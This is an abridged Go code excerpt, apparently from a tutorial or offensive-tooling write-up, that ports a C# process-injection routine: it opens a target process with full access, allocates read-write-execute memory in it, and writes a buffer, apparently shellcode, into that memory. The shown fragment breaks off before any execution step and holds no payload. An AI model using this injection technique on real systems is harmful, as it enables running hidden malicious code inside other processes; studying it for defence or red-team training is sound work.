...
func OpenProcess(processAccess int, bInheritHandle int, processId int) uintptr {
...
func main() {
   ...
   // OpenProcess(0x001F0FFF, false, Int32.Parse(processPID));
   var proc_handle uintptr;
   proc_handle = OpenProcess(0x001F0FFF, 0, pid_int);
   fmt.Println("[+] Process handle: \t\t", fmt.Sprintf("0x%x", proc_handle));

   // VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
   var assigned_address uintptr;
   assigned_address = VirtualAllocEx(proc_handle, 0, 0x1000, 0x3000, 0x40);
   fmt.Println("[+] Assigned address: \t\t", fmt.Sprintf("0x%x", assigned_address));

   // WriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
   var res uintptr;
   ...
   res = WriteProcessMemory(proc_handle, assigned_address, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)));
